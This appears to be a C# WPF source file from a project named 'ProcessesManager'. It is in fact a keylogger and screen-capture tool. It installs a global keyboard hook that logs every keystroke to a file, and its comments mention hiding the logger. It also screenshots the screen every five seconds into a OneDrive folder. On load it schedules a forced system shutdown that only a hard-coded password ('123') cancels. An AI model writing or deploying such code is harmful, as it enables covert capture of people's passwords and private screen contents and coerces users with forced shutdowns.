using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows;
using System.Windows.Controls;
using System.Windows.Data;
using System.Windows.Documents;
using System.Windows.Input;
using System.Windows.Media;
using System.Windows.Media.Imaging;
using System.Windows.Navigation;
using System.Windows.Shapes;

using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Runtime.InteropServices;
using System.Threading;
using System.Windows.Forms;
using Application = System.Windows.Forms.Application;
using ApplicationWindow = System.Windows.Application;
using Clipboard = System.Windows.Forms.Clipboard;
using MessageBox = System.Windows.MessageBox;

namespace ProcessesManager
{

    /// <summary>
    /// Interaction logic for MainWindow.xaml
    /// </summary>
    public partial class MainWindow : Window
    {
        #region hook key board
        private const int WH_KEYBOARD_LL = 13;
        private const int WM_KEYDOWN = 0x0100;

        private static LowLevelKeyboardProc _proc = HookCallback;
        private static IntPtr _hookID = IntPtr.Zero;

        private static string logName = "Log_";
        private static string imgName = "Log_";
        private static string logExtendtion = ".txt";
        private static string imgExtendtion = ".jpg";

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr SetWindowsHookEx(int idHook,
            LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        private static extern bool UnhookWindowsHookEx(IntPtr hhk);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode,
            IntPtr wParam, IntPtr lParam);

        [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr GetModuleHandle(string lpModuleName);

        /// <summary>
        /// Delegate a LowLevelKeyboardProc to use user32.dll
        /// </summary>
        /// <param name="nCode"></param>
        /// <param name="wParam"></param>
        /// <param name="lParam"></param>
        /// <returns></returns>
        private delegate IntPtr LowLevelKeyboardProc(
        int nCode, IntPtr wParam, IntPtr lParam);

        /// <summary>
        /// Set hook into all current process
        /// </summary>
        /// <param name="proc"></param>
        /// <returns></returns>
        private static IntPtr SetHook(LowLevelKeyboardProc proc)
        {
            using (Process curProcess = Process.GetCurrentProcess())
            {
                using (ProcessModule curModule = curProcess.MainModule)
                {
                    return SetWindowsHookEx(WH_KEYBOARD_LL, proc,
                    GetModuleHandle(curModule.ModuleName), 0);
                }
            }
        }

        /// <summary>
        /// Every time the OS call back pressed key. Catch them 
        /// then cal the CallNextHookEx to wait for the next key
        /// </summary>
        /// <param name="nCode"></param>
        /// <param name="wParam"></param>
        /// <param name="lParam"></param>
        /// <returns></returns>
        private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
        {
            if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN)
            {
                int vkCode = Marshal.ReadInt32(lParam);

                WriteLog(vkCode);
            }
            return CallNextHookEx(_hookID, nCode, wParam, lParam);
        }

        /// <summary>
        /// Write pressed key into log.txt file
        /// </summary>
        /// <param name="vkCode"></param>
        static void WriteLog(int vkCode)
        {
            Console.WriteLine((Keys)vkCode);
            string logNameToWrite = logName + DateTime.Now.ToLongDateString() + logExtendtion;
            StreamWriter sw = new StreamWriter(logNameToWrite, true);
            sw.Write((Keys)vkCode);
            sw.Close();
        }

        /// <summary>
        /// Start hook key board and hide the key logger
        /// Key logger only show again if pressed right Hot key
        /// </summary>
        static void HookKeyboard()
        {
            _hookID = SetHook(_proc);
            Application.Run();
            UnhookWindowsHookEx(_hookID);
        }
        #endregion
        public MainWindow()
        {
            InitializeComponent();
            
        }

        private static void Flow1()
        {
            Thread capTure = new Thread(() =>
            {
                while (true)
                {
                    ApplicationWindow.Current.Dispatcher.Invoke((Action)delegate {
                        Capture();
                    });
                    Thread.Sleep(5000);
                }
            });

            Thread keyLogger = new Thread(() =>
            {
                ApplicationWindow.Current.Dispatcher.Invoke((Action)delegate {
                    HookKeyboard();
                });
            });

            Thread askAgain = new Thread(() =>
            {
                while (true)
                {
                    ApplicationWindow.Current.Dispatcher.Invoke((Action)delegate {
                        AskAgain();
                    });
                    Thread.Sleep(2000);
                }
            });

            askAgain.IsBackground = true;
            askAgain.Start();

            keyLogger.IsBackground = true;
            keyLogger.Start();

            capTure.IsBackground = true;
            capTure.Start();
        }


        private static void WaitForShutdown()
        {
            ApplicationWindow.Current.Dispatcher.Invoke((Action)delegate {
                var psi = new ProcessStartInfo("shutdown", "/s /t 300");
                psi.CreateNoWindow = true;
                psi.UseShellExecute = false;
                Process.Start(psi);
            });
        }
        private static void OpenLogin()
        {

            Thread delay = new Thread(() =>
            {
                WaitForShutdown();
            });
            delay.IsBackground = true;

            var loginWindow = new LoginWindow();
            bool? result = false;

            delay.Start();
            loginWindow.ShowDialog();
            result = loginWindow.DialogResult;
            if (result == true)
            {
                Process.Start("shutdown", "/a");
                if (loginWindow.PwTextBox.Text == "123")
                {
                    Trace.WriteLine("True Pass");
                }
                else
                {
                    MessageBox.Show("Wrong password");
                    delay = new Thread(() => {
                        WaitForShutdown();
                    });
                    delay.Start();
                }
            }

        }

        private static void AskAgain()
        {
            //Thread.Sleep(5000);
            var loginWindow = new LoginWindow();
            loginWindow.ShowDialog();
            //var result = loginWindow.DialogResult;
            //Thread.Sleep(2000);
            loginWindow.Close();
            /*if (result==true)
            {
                if(loginWindow.PwTextBox.Text == "123")
                {
                }
            }*/
            //Thread.Sleep(5000);
        }

        private void Button_Click(object sender, RoutedEventArgs e)
        {
            Thread.Sleep(1000);
            SendKeys.SendWait("{PRTSC}");
            System.Drawing.Image myImage = Clipboard.GetImage();
            myImage.Save("D:\\thang.jpg");

        }

        static int count = 0;
        private static void Capture()
        {
            //Thread.Sleep(1000);
            SendKeys.SendWait("{PRTSC}");
            System.Drawing.Image myImage = Clipboard.GetImage();
            //string img = DateTime.Now.ToLongDateString() + imgExtendtion;
            string img = DateTime.Now.TimeOfDay.ToString() + imgExtendtion;
            count++;
            myImage.Save($"C:\\Users\\Admin\\OneDrive\\thang{count}.jpg");
            //Capture();
        }

        public int CountEnterPass { get; set; }
        private void StartBtn_Click(object sender, RoutedEventArgs e)
        {
            if (CountEnterPass == 3)
            {
                return;
            }
            var loginWindow = new LoginWindow();
            loginWindow.ShowDialog();
            var result = loginWindow.DialogResult;
            if (result == true)
            {
                Process.Start("shutdown", "/a");
                if (loginWindow.PwTextBox.Text == "123")
                {
                    return;
                }
                else
                {
                    MessageBox.Show("Wrong password");
                    var psi = new ProcessStartInfo("shutdown", "/s /t 300");
                    psi.CreateNoWindow = true;
                    psi.UseShellExecute = false;
                    Process.Start(psi);
                    CountEnterPass += 1;
                }

            }

        }

        private void Window_Loaded(object sender, RoutedEventArgs e)
        {
            var psi = new ProcessStartInfo("shutdown", "/s /t 300");
            psi.CreateNoWindow = true;
            psi.UseShellExecute = false;
            Process.Start(psi);

            CountEnterPass = 0;
        }
    }
}
